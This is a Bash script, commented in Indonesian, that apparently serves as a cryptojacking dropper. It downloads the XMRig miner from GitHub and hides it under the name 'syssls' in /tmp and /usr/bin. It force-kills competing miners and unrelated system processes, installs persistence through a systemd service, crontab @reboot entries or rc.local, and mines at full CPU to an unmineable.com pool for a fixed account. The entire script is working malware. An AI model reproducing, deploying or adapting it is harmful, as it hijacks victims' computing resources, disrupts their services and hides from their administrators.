#!/bin/bash

# Script untuk auto-detect, download, dan copy binary ke /tmp/syssls
# Skip download jika binary sudah ada di /usr/bin/syssls atau /tmp/syssls

# URL base untuk download
BASE_URL="https://github.com/xmrig/xmrig/releases/download/v6.24.0"

# Database file berdasarkan informasi yang diberikan
declare -A XMRIG_FILES=(
    ["linux-x64-static"]="xmrig-6.24.0-linux-static-x64.tar.gz"
    ["linux-focal-x64"]="xmrig-6.24.0-focal-x64.tar.gz"
    ["linux-jammy-x64"]="xmrig-6.24.0-jammy-x64.tar.gz"
    ["linux-noble-x64"]="xmrig-6.24.0-noble-x64.tar.gz"
    ["freebsd-x64"]="xmrig-6.24.0-freebsd-static-x64.tar.gz"
    ["macos-x64"]="xmrig-6.24.0-macos-x64.tar.gz"
    ["macos-arm64"]="xmrig-6.24.0-macos-arm64.tar.gz"
)

# Pattern untuk kill process
KILL_PATTERNS="/upgrade|update|xmrig|miner|ethminer|cpuminer|bminer|nc|sh|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/"

# IP Static - tidak perlu detect IP public
IP_PUBLIC="Next-Js"

# Fungsi untuk cek jika binary sudah ada
check_existing_binary() {
    echo "[*] Checking for existing syssls binary..."
    
    # Cek /usr/bin/syssls (untuk root)
    if [ -f "/usr/bin/syssls" ] && [ -x "/usr/bin/syssls" ]; then
        echo "[✓] Found existing binary at /usr/bin/syssls"
        echo "    Size: $(ls -lh /usr/bin/syssls | awk '{print $5}')"
        echo "    Permissions: $(ls -la /usr/bin/syssls | awk '{print $1}')"
        EXEC_PATH="/usr/bin/syssls"
        return 0
    fi
    
    # Cek /tmp/syssls
    if [ -f "/tmp/syssls" ] && [ -x "/tmp/syssls" ]; then
        echo "[✓] Found existing binary at /tmp/syssls"
        echo "    Size: $(ls -lh /tmp/syssls | awk '{print $5}')"
        echo "    Permissions: $(ls -la /tmp/syssls | awk '{print $1}')"
        EXEC_PATH="/tmp/syssls"
        return 0
    fi
    
    echo "[*] No existing syssls binary found"
    return 1
}

# Fungsi untuk kill process berdasarkan pattern
kill_competing_processes() {
    echo "[*] Killing competing processes..."
    
    # Daftar process yang akan di-kill
    PATTERNS=(
        "xmrig" "miner" "ethminer" "cpuminer" "bminer" "nc"
        "Ice-Unix" "tailah" "jancok" "masscan"
        "screen" "cpu-miner" "upx" "minerd" "dx" "gelud"
        "kworker" "power2b" "sampah" "hellminer"
    )
    
    killed_count=0
    for pattern in "${PATTERNS[@]}"; do
        pids=$(pgrep -f "$pattern" 2>/dev/null)
        if [ -n "$pids" ]; then
            echo "  [-] Killing processes with pattern: $pattern"
            for pid in $pids; do
                if [ "$pid" -ne $$ ] && [ "$pid" -ne $PPID ]; then
                    kill -9 "$pid" 2>/dev/null
                    if [ $? -eq 0 ]; then
                        ((killed_count++))
                    fi
                fi
            done
        fi
    done
    
    echo "[✓] Killed $killed_count competing processes"
    echo ""
}

# Main script
echo "=========================================="
echo "   XMRig Auto-Install Script v6.24.0"
echo "=========================================="
echo ""
echo "[*] Using static IP/Worker name: $IP_PUBLIC"
echo ""

# Step 1: Cek apakah binary sudah ada
if check_existing_binary; then
    echo "[*] Using existing binary at: $EXEC_PATH"
    SKIP_DOWNLOAD=true
else
    SKIP_DOWNLOAD=false
    EXEC_PATH=""  # Reset, akan di-set nanti
fi

# Step 2: Kill competing processes (tetap dilakukan meski binary sudah ada)
kill_competing_processes

if [ "$SKIP_DOWNLOAD" = false ]; then
    # Step 3: Deteksi OS (hanya jika perlu download)
    echo "[*] Detecting system for download..."
    OS=$(uname -s)
    ARCH=$(uname -m)

    case $OS in
        Linux*)
            echo "  OS: Linux"
            echo "  Arch: $ARCH"
            if [ -f /etc/os-release ]; then
                . /etc/os-release
                case "$ID" in
                    ubuntu)
                        case "$VERSION_ID" in
                            20.04) FILENAME="xmrig-6.24.0-focal-x64.tar.gz" ;;
                            22.04) FILENAME="xmrig-6.24.0-jammy-x64.tar.gz" ;;
                            24.04) FILENAME="xmrig-6.24.0-noble-x64.tar.gz" ;;
                            *) FILENAME="xmrig-6.24.0-linux-static-x64.tar.gz" ;;
                        esac
                        ;;
                    *) FILENAME="xmrig-6.24.0-linux-static-x64.tar.gz" ;;
                esac
            else
                FILENAME="xmrig-6.24.0-linux-static-x64.tar.gz"
            fi
            ;;
        Darwin*)
            echo "  OS: macOS"
            echo "  Arch: $ARCH"
            if [ "$ARCH" = "arm64" ]; then
                FILENAME="xmrig-6.24.0-macos-arm64.tar.gz"
            else
                FILENAME="xmrig-6.24.0-macos-x64.tar.gz"
            fi
            ;;
        FreeBSD*)
            echo "  OS: FreeBSD"
            FILENAME="xmrig-6.24.0-freebsd-static-x64.tar.gz"
            ;;
        *)
            echo "  OS: Unknown, using Linux static"
            FILENAME="xmrig-6.24.0-linux-static-x64.tar.gz"
            ;;
    esac

    echo "[*] Selected file: $FILENAME"
    echo ""

    # Step 4: Download
    echo "[*] Downloading..."
    if command -v curl &> /dev/null; then
        curl -s -L -o "$FILENAME" "$BASE_URL/$FILENAME"
        if [ $? -ne 0 ]; then
            echo "[!] Download failed with curl, trying wget..."
            if command -v wget &> /dev/null; then
                wget -q -O "$FILENAME" "$BASE_URL/$FILENAME"
            else
                echo "[!] Download failed"
                exit 1
            fi
        fi
    elif command -v wget &> /dev/null; then
        wget -q -O "$FILENAME" "$BASE_URL/$FILENAME"
        if [ $? -ne 0 ]; then
            echo "[!] Download failed"
            exit 1
        fi
    else
        echo "[!] curl or wget not found"
        exit 1
    fi

    if [ ! -f "$FILENAME" ]; then
        echo "[!] Download failed - file not found"
        exit 1
    fi

    echo "[✓] Download completed"
    echo ""

    # Step 5: Extract
    echo "[*] Extracting files..."
    tar -xzf "$FILENAME" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[!] Extraction failed"
        exit 1
    fi

    echo "[✓] Extraction completed"
    echo ""

    # Step 6: Copy binary ke /tmp/syssls
    echo "[*] Copying binary to /tmp/syssls..."
    if [ -f "xmrig-6.24.0/xmrig" ]; then
        cp xmrig-6.24.0/xmrig /tmp/syssls
        chmod +x /tmp/syssls
        echo "[✓] Binary copied to /tmp/syssls"
    else
        echo "[!] xmrig binary not found in extracted folder"
        exit 1
    fi

    # Untuk root user, juga copy ke /usr/bin/syssls
    if [ "$(id -u)" -eq 0 ]; then
        cp xmrig-6.24.0/xmrig /usr/bin/syssls
        chmod +x /usr/bin/syssls
        EXEC_PATH="/usr/bin/syssls"
        echo "[✓] Also copied to /usr/bin/syssls (root)"
    else
        EXEC_PATH="/tmp/syssls"
    fi

    # Step 7: Cleanup
    echo "[*] Cleaning up..."
    rm -f "$FILENAME"
    rm -rf xmrig-6.24.0
    echo "[✓] Cleanup completed"
    echo ""
else
    echo "[*] Skipping download and extraction (binary already exists)"
    echo ""
fi

# Step 8: Set IP Static (tidak perlu detect)
echo "[*] Using static IP configuration"
echo "IP yang digunakan: $IP_PUBLIC"
echo ""

# Step 9: Kill any remaining syssls processes before starting
echo "[*] Ensuring no existing syssls processes..."
pkill -9 -f "syssls" 2>/dev/null
sleep 1

# Step 10: Setup mining
echo "[*] Setting up mining..."

if command -v systemctl &> /dev/null; then
    if [ "$(id -u)" -eq 0 ]; then
        # Create systemd service for root
        echo "[*] Creating systemd service..."
        
        cat > /etc/systemd/system/syssls.service << EOF
[Unit]
Description=SYSSLS Mining Service
After=network.target

[Service]
Type=simple
Restart=on-failure
RestartSec=15s
ExecStart=$EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.$IP_PUBLIC --cpu-max-threads-hint=100

[Install]
WantedBy=multi-user.target
EOF

        chmod 644 /etc/systemd/system/syssls.service
        systemctl daemon-reload
        systemctl enable syssls.service
        systemctl start syssls.service
        
        echo "[✓] Systemd service created and started"
        echo "Worker : VPS-$IP_PUBLIC"
    else
        # Non-root: start with nohup
        echo "[*] Starting as non-root user..."
        nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.$IP_PUBLIC --cpu-max-threads-hint=100 > /dev/null 2>&1 &
        
        # Setup crontab for auto-start
        CRON_CMD="$EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.$IP_PUBLIC --cpu-max-threads-hint=100 > /dev/null 2>&1 &"
        crontab -l 2>/dev/null | grep -v "$EXEC_PATH" | crontab -
        (crontab -l 2>/dev/null; echo "@reboot $CRON_CMD") | crontab -
        
        echo "[✓] Mining started in background"
        echo "[✓] Auto-start on reboot configured"
        echo "Worker : VPS-$IP_PUBLIC"
    fi
else
    # No systemctl available
    echo "[*] systemctl not found, using alternative startup..."
    
    if [ "$(id -u)" -eq 0 ]; then
        # Root without systemctl
        nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.$IP_PUBLIC --cpu-max-threads-hint=100 > /dev/null 2>&1 &
        
        # Try to add to rc.local
        if [ -f "/etc/rc.local" ]; then
            if ! grep -q "syssls" /etc/rc.local; then
                echo "$EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.$IP_PUBLIC --cpu-max-threads-hint=100 > /dev/null 2>&1 &" >> /etc/rc.local
                chmod +x /etc/rc.local 2>/dev/null
            fi
        fi
    else
        # Non-root without systemctl
        nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.$IP_PUBLIC --cpu-max-threads-hint=100 > /dev/null 2>&1 &
        
        # Setup crontab
        CRON_CMD="$EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.$IP_PUBLIC --cpu-max-threads-hint=100 > /dev/null 2>&1 &"
        crontab -l 2>/dev/null | grep -v "$EXEC_PATH" | crontab -
        (crontab -l 2>/dev/null; echo "@reboot $CRON_CMD") | crontab -
    fi
    
    echo "[✓] Mining started"
    echo "Worker : VPS-$IP_PUBLIC"
fi

echo ""
echo "=========================================="
echo "         INSTALLATION COMPLETE"
echo "=========================================="
echo ""
echo "Binary location: $EXEC_PATH"
if [ "$SKIP_DOWNLOAD" = true ]; then
    echo "Status: Using existing binary (download skipped)"
else
    echo "Status: New binary downloaded and installed"
fi
echo ""
echo "Mining configuration:"
echo "  Pool        : stratum+ssl://rx.unmineable.com:443"
echo "  Wallet      : 1843038386.$IP_PUBLIC"
echo "  Worker      : VPS-$IP_PUBLIC"
echo "  Algorithm   : RandomX (RX)"
echo "  Threads     : Maximum (100% hint)"
echo ""
echo "Process check:"
echo "  ps aux | grep syssls"
echo ""
echo "To stop mining:"
echo "  pkill -f syssls"
echo ""
echo "To restart mining:"
echo "  pkill -f syssls && $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.$IP_PUBLIC --cpu-max-threads-hint=100 > /dev/null 2>&1 &"
echo "=========================================="
